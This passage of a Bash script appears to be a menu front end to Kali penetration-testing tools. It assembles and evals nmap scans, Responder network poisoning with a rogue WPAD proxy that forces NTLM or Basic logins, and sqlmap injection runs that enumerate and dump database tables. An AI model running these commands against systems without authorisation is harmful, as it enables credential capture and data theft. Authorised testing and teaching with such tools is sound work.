    echo "  -sn:            Ping Scan - disable port scan"
    echo "  -oA <basename>: Output in the three major formats at once"
    echo "  -v:             Increase verbosity level (use -vv or more for greater effect)"
    read -p "Target IP: " TARGET
    cmd="nmap"
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[2]$cmd${NC} > ${BLUE}[1]Ping Scan${NC}\n"
    cmd="${CMD} -sn -v -oA pingscan_`date +"+%Y%m%d-%H%M%S"` $TARGET" 
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function cmd_nmap2(){
    clear
	figlet Nmap
    printf "${BLUE}usage${NC}: nmap ${WHITE}[Scan Type...] [Options] {target specification}${NC}\n"
    printf "${BLUE}Options${NC}:\n"
    echo "  -Pn:            Treat all hosts as online -- skip host discovery"
    echo "  -T<0-5>:        Set timing template (higher is faster)"
    echo "  -A:             Enable OS detection, version detection, script scanning, and traceroute"
    echo "  -oA <basename>: Output in the three major formats at once"
    echo "  -v:             Increase verbosity level (use -vv or more for greater effect)"
    read -p "Target IP: " TARGET
    cmd="nmap"
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[2]$cmd${NC} > ${BLUE}[2]IntenseScan${NC}\n"
    cmd="${CMD} -Pn -T4 -A -v -oA IntenseScan_`date +"+%Y%m%d-%H%M%S"` $TARGET" 
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function cmd_nmap3(){
    clear
	figlet Nmap
    printf "${BLUE}usage${NC}: nmap ${WHITE}[Scan Type...] [Options] {target specification}${NC}\n"
    printf "${BLUE}Options${NC}:\n"
    echo "  -Pn:            Treat all hosts as online -- skip host discovery"
    echo "  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scANS"
    echo "  -sU:             UDP Scan"
    echo "  -T<0-5>:         Set timing template (higher is faster)"
    echo "  -A:              Enable OS detection, version detection, script scanning, and traceroute"
    echo "  -oA <basename>:  Output in the three major formats at once"
    echo "  -v:              Increase verbosity level (use -vv or more for greater effect)"
    read -p "Target IP: " TARGET
    cmd="nmap"
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[2]$cmd${NC} > ${BLUE}[3]IntenseScan+UDP${NC}\n"
    cmd="${CMD} -Pn -sS -sU -T4 -A -v -oA IntenseScanUDP_`date +"+%Y%m%d-%H%M%S"` $TARGET" 
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function cmd_nmap4(){
    clear
	figlet Nmap
    printf "${BLUE}usage${NC}: nmap ${WHITE}[Scan Type...] [Options] {target specification}${NC}\n"
    printf "${BLUE}Options${NC}:\n"
    echo "  -Pn:            Treat all hosts as online -- skip host discovery"
    echo "  -p <port ranges>: Only scan specified ports"
    echo "         Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9"
    echo "  -T<0-5>:          Set timing template (higher is faster)"
    echo "  -A:               Enable OS detection, version detection, script scanning, and traceroute"
    echo "  -oA <basename>:   Output in the three major formats at once"
    echo "  -v:               Increase verbosity level (use -vv or more for greater effect)"
    read -p "Target IP: " TARGET
    cmd="nmap"
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[2]$cmd${NC} > ${BLUE}[4]IntenseScan_all_TCP${NC}\n"
    cmd="${CMD} -Pn -p 1-65535 -T4 -A -v -oA IntenseScanAllTCP_`date +"+%Y%m%d-%H%M%S"` $TARGET" 
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function cmd_nmap5(){
    clear
	figlet Nmap
    printf "${BLUE}usage${NC}: nmap ${WHITE}[Scan Type...] [Options] {target specification}${NC}\n"
    printf "${BLUE}Options${NC}:\n"
    echo "  -Pn:                    Treat all hosts as online -- skip host discovery"
    echo "  --script=<Lua scripts>: <Lua scripts> is a comma separated list of"
    echo "                          directories, script-files or script-categories"
    echo "  -oA <basename>:         Output in the three major formats at once"
    echo "  -v:                     Increase verbosity level (use -vv or more for greater effect)"
    read -p "Target IP: " TARGET
    cmd="nmap"
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[2]$cmd${NC} > ${BLUE}[5]Vuln Scan${NC}\n"
    cmd="${CMD} -Pn --script vuln -v -oA ScriptScanVuln_`date +"+%Y%m%d-%H%M%S"` $TARGET" 
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function menu_responder(){
	clear
	figlet Responder
    printf "${WHITE}+---+\n"
    printf "| 1 |%s\n" " Kali-tools-top10"
    printf "+---+\n"
    printf "${BLUE}%5s+---+\n"
    printf "%5s| 3 |%s\n" "" " responder"
    printf "%5s+---+\n"
    printf "${WHITE}%10s+---+\n"
    printf "%10s| 1 |%s\n" "" " Basic Usage"
    printf "%10s+---+%s\n"
    printf "%10s+---+\n"
    printf "%10s| 2 |%s\n" "" " Analyze mode" 
    printf "%10s+---+%s\n" 
    printf "%10s+---+\n"
    printf "%10s| 3 |%s\n" "" " Poisoning with Responder" 
    printf "%10s+---+%s\n" 
    printf "%10s+---+\n"
    printf "%10s| 4 |%s\n" "" " Basic Authentication & WPAD" 
    printf "%10s+---+%s${NC}\n" 
	read -n 1 -s NUM
    case $NUM in
    1)
        cmd_responder1
        ;;
    2)
        cmd_responder2
        ;;
	3)
        cmd_responder3
		;;
    4)
        cmd_responder4
        ;;
    *)
        ;;
    esac
}

function cmd_responder1(){
	clear
	figlet Responder
    printf "${BLUE}usage${NC} :Usage: responder ${WHITE}[Options]${NC}\n"
    printf "${BLUE}Options${NC}:\n"
    echo "  -I eth0, --interface=eth0"
    echo "                  Network interface to use, you can use 'ALL' as a"
    echo "                  wildcard for all interfaces"
    echo "  -w, --wpad      Start the WPAD rogue proxy server. Default value is False"
    echo "  -d, --DHCP      Enable ANSwers for DHCP broadcast requests. This"
    echo "                  option will inject a WPAD server in the DHCP response."
    read -p "Network interface: " INTERFACE
    cmd="responder"
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[3]$cmd${NC} > ${BLUE}[1]Basic Usage${NC}\n"
    cmd="${cmd} -I ${INTERFACE} -wd"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function cmd_responder2(){
	clear
	figlet Responder
    printf "${BLUE}usage${NC} :Usage: responder ${WHITE}[Options]${NC}\n"
    printf "${BLUE}Options${NC}:\n"
    echo "  -I eth0, --interface=eth0"
    echo "                  Network interface to use, you can use 'ALL' as a"
    echo "                  wildcard for all interfaces"
    echo "  -A, --analyze   Analyze mode. This option allows you to see NBT-NS,"
    echo "                  BROWSER, LLMNR requests without responding."
    read -p "Network interface: " INTERFACE
    cmd="responder"
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[3]$cmd${NC} > ${BLUE}[2]Analyze mode${NC}\n"
    cmd="${cmd} -I ${INTERFACE} -A"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function cmd_responder3(){
	clear
	figlet Responder
    printf "${BLUE}usage${NC} :Usage: responder ${WHITE}[Options]${NC}\n"
    printf "${BLUE}Options${NC}:\n"
    echo "  -I eth0, --interface=eth0"
    echo "                  Network interface to use, you can use 'ALL' as a"
    echo "                  wildcard for all interfaces"
    read -p "Network interface: " INTERFACE
    cmd="responder"
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[3]$cmd${NC} > ${BLUE}[3]Poisoning${NC}\n"
    cmd="${cmd} -I ${INTERFACE}"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function cmd_responder4(){
	clear
	figlet Responder
    printf "${BLUE}usage${NC} :Usage: responder ${WHITE}[Options]${NC}\n"
    printf "${BLUE}Options${NC}:\n"
    echo "  -I eth0, --interface=eth0"
    echo "                        Network interface to use, you can use 'ALL' as a"
    echo "                        wildcard for all interfaces"
    echo "  -w, --wpad            Start the WPAD rogue proxy server. Default value is False"
    echo "  -b, --basic           Return a Basic HTTP authentication. Default: NTLM"
    echo "  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file"
    echo "                        retrieval. This may cause a login prompt. Default:"
    cmd="responder"
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[3]$cmd${NC} > ${BLUE}[4]WPAD${NC}\n"
    read -p "Network interface: " INTERFACE
    cmd="${cmd} -I ${INTERFACE} -wbF"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function menu_sqlmap(){
	clear
	figlet sqlmap
    printf "${WHITE}+---+\n"
    printf "| 1 |%s\n" " Kali-tools-top10"
    printf "+---+\n"
    printf "${BLUE}%5s+---+\n"
    printf "%5s| 4 |%s\n" "" " sqlmap"
    printf "%5s+---+\n"
    printf "${WHITE}%10s+---+\n"
    printf "%10s| 1 |%s\n" "" " GET request"
    printf "%10s+---+%s\n"
    printf "%10s+---+\n"
    printf "%10s| 2 |%s\n" "" " POST request" 
    printf "%10s+---+%s\n" 
    printf "%10s+---+\n"
    printf "%10s| 3 |%s\n" "" " Find out what databases exist" 
    printf "%10s+---+%s\n" "" " with SQL injection"
    printf "%10s+---+\n"
    printf "%10s| 4 |%s\n" "" " Find out what table exist" 
    printf "%10s+---+%s\n" "" " with SQL injection"
    printf "%10s+---+\n"
    printf "%10s| 5 |%s\n" "" " Display table contents" 
    printf "%10s+---+%s${NC}\n" "" " with SQL injection"
	read -n 1 -s NUM
    case $NUM in
    1)
        cmd_sqlmap1
        ;;
    2)
        cmd_sqlmap2
        ;;
	3)
        cmd_sqlmap3
		;;
    4)
        cmd_sqlmap4
        ;;
    5)
        cmd_sqlmap5
        ;;
    *)
        ;;
    esac

}

function cmd_sqlmap1(){
	clear
	figlet sqlmap
    printf "${BLUE}usage${NC} :sqlmap  ${WHITE}[options]${NC}\n"
    printf "${BLUE}Options${NC}:\n"
    echo "  -u URL, --url=URL   Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")"
    read -p "Target URL: " URL
    cmd="sqlmap"
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[4]$cmd${NC} > ${BLUE}[1]GET request${NC}\n"
    cmd="${CMD} -u \"$URL\"" 
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function cmd_sqlmap2(){
	clear
	figlet sqlmap
    printf "${BLUE}usage${NC} :sqlmap  ${WHITE}[options]${NC}\n"
    printf "${BLUE}Options${NC}:\n"
    echo "  -u URL, --url=URL   Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")"
    printf "${BLUE}Request${NC}:\n"
    echo "  These options can be used to specify how to connect to the target URL"
    echo "  --data=DATA         Data string to be sent through POST (e.g. \"id=1\")"
    printf "${BLUE}Detection${NC}:\n"
    echo "  These options can be used to customize the detection phase"
    echo "  --level=LEVEL       Level of tests to perform (1-5, default 1)"
    echo "  --risk=RISK         Risk of tests to perform (1-3, default 1)"
    read -p "Target URL: " URL
    read -p "POST parameter:" POST
    cmd="${CMD} -u \"$URL\" --data $POST" 
    read -p "Level(1-5, default 1): " LEVEL
    if [ ! -z $LEVEL ];then
        cmd+=" --level $LEVEL"
    fi
    read -p "Risk(1-3, default 1): " RISK
    if [ ! -z $RISK ];then
        cmd+=" --risk $RISK"
    fi
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[4]sqlmap${NC} > ${BLUE}[2]POST request${NC}\n"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function cmd_sqlmap3(){
	clear
	figlet sqlmap
    printf "${BLUE}usage${NC} :sqlmap  ${WHITE}[options]${NC}\n"
    printf "${BLUE}Options${NC}:\n"
    echo "  -u URL, --url=URL   Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")"
    printf "${BLUE}Request${NC}:\n"
    echo "  These options can be used to specify how to connect to the target URL"
    echo "  --data=DATA         Data string to be sent through POST (e.g. \"id=1\")"
    printf "${BLUE}Detection${NC}:\n"
    echo "  These options can be used to customize the detection phase"
    echo "  --level=LEVEL       Level of tests to perform (1-5, default 1)"
    echo "  --risk=RISK         Risk of tests to perform (1-3, default 1)"
    read -p "Target URL: " URL
    read -p "POST parameter:" POST
    cmd="${CMD} -u \"$URL\" --data $POST" 
    read -p "Level(1-5, default 1): " LEVEL
    if [ ! -z $LEVEL ];then
        cmd+=" --level $LEVEL"
    fi
    read -p "Risk(1-3, default 1): " RISK
    if [ ! -z $RISK ];then
        cmd+=" --risk $RISK"
    fi
    printf "${BLUE}Enumeration${NC}:\n"
    echo "  These options can be used to enumerate the back-end database"
    echo "  management system information, structure and data contained in the tables"
    echo "  --dbs               Enumerate DBMS databases"
    read -n 1 -p "Enumerate DBMS databases? y|n> " DBS
    if [ $DBS = "y" ] || [ $DBS = "Y" ];then
        cmd+=" --dbs"
    fi
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[4]sqlmap${NC} > ${BLUE}[3]Find out what DB exist with SQLi${NC}\n"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function cmd_sqlmap4(){
	clear
	figlet sqlmap
    printf "${BLUE}usage${NC} :sqlmap  ${WHITE}[options]${NC}\n"
    printf "${BLUE}Options${NC}:\n"
    echo "  -u URL, --url=URL   Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")"
    printf "${BLUE}Request${NC}:\n"
    echo "  These options can be used to specify how to connect to the target URL"
    echo "  --data=DATA         Data string to be sent through POST (e.g. \"id=1\")"
    printf "${BLUE}Detection${NC}:\n"
    echo "  These options can be used to customize the detection phase"
    echo "  --level=LEVEL       Level of tests to perform (1-5, default 1)"
    echo "  --risk=RISK         Risk of tests to perform (1-3, default 1)"
    read -p "Target URL: " URL
    read -p "POST parameter:" POST
    cmd="${CMD} -u \"$URL\" --data $POST" 
    read -p "Level(1-5, default 1): " LEVEL
    if [ ! -z $LEVEL ];then
        cmd+=" --level $LEVEL"
    fi
    read -p "Risk(1-3, default 1): " RISK
    if [ ! -z $RISK ];then
        cmd+=" --risk $RISK"
    fi
    printf "${BLUE}Enumeration${NC}:\n"
    echo "  These options can be used to enumerate the back-end database"
    echo "  management system information, structure and data contained in the tables"
    echo "  -D DB               DBMS database to enumerate"
    echo "  --tables            Enumerate DBMS database tables"
    read -p "Database: "DATABASE_NAME
    cmd+=" -D \"$DATABASE_NAME\""
    read -n 1 -p "Enumerate DBMS database tables y|n> " TABLE
    if [ $TABLE = "y" ] || [ $TABLE = "Y" ];then
        cmd+=" --tables"
    fi
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[4]sqlmap${NC} > ${BLUE}[4]Find out what table exist with SQLi${NC}\n"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

function cmd_sqlmap5(){
	clear
	figlet sqlmap
    printf "${BLUE}usage${NC} :sqlmap  ${WHITE}[options]${NC}\n"
    printf "${BLUE}Options${NC}:\n"
    echo "  -u URL, --url=URL   Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")"
    printf "${BLUE}Request${NC}:\n"
    echo "  These options can be used to specify how to connect to the target URL"
    echo "  --data=DATA         Data string to be sent through POST (e.g. \"id=1\")"
    printf "${BLUE}Detection${NC}:\n"
    echo "  These options can be used to customize the detection phase"
    echo "  --level=LEVEL       Level of tests to perform (1-5, default 1)"
    echo "  --risk=RISK         Risk of tests to perform (1-3, default 1)"
    read -p "Target URL: " URL
    read -p "POST parameter:" POST
    cmd="${CMD} -u \"$URL\" --data $POST" 
    read -p "Level(1-5, default 1): " LEVEL
    if [ ! -z $LEVEL ];then
        cmd+=" --level $LEVEL"
    fi
    read -p "Risk(1-3, default 1): " RISK
    if [ ! -z $RISK ];then
        cmd+=" --risk $RISK"
    fi
    printf "${BLUE}Enumeration${NC}:\n"
    echo "  These options can be used to enumerate the back-end database"
    echo "  management system information, structure and data contained in the tables"
    echo "  -D DB               DBMS database to enumerate"
    echo "  -T TBL              DBMS database table(s) to enumerate"
    echo "  --dump              Dump DBMS database table entries"
    read -p "Database: "DATABASE_NAME
    cmd+=" -D \"$DATABASE_NAME\""
    read -p "Tables: "TABLE_NAME
    cmd+=" -T \"$TABLE_NAME\""
    read -n 1 -p "Dump DBMS database table entries? y|n> " DUMP
    if [ $DUMP = "y" ] || [ $DUMP = "Y" ];then
        cmd+=" --dump"
    fi
    printf "┌─(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}[1]Kali-tools-top10${NC} > ${BLUE}[4]sqlmap${NC} > ${BLUE}[5]FDisplay table contents with SQLi${NC}\n"
    echo "└─Command? > $cmd"
    read -n 1 -p "You ready? y|n > " ANS
    echo ""
    if [ $ANS = "y" ] || [ $ANS = "y" ];then
        eval $cmd
    fi
}

clear
while :;do
	echo -e "(${PURPLE}$TITLE${NC})${RED}`whoami`@`hostname`${NC}:${BLUE}`pwd`${NC}"
	read -e -p "Command? > " str
    case $str in
    "kk"|"k"|"kiddy"|"kalikiddy"|"menu")
		mainmenu
		read -n 1 -s NUM
            case $NUM in
            1)
                kalitoolstop10_menu1
                ;;
            2)
                ;;
            3)
                ;;
            *)
                ;;
            esac
            ;;
	"exit")
		exit 0
        ;;
	*)
		eval $str
        ;;
    esac
done
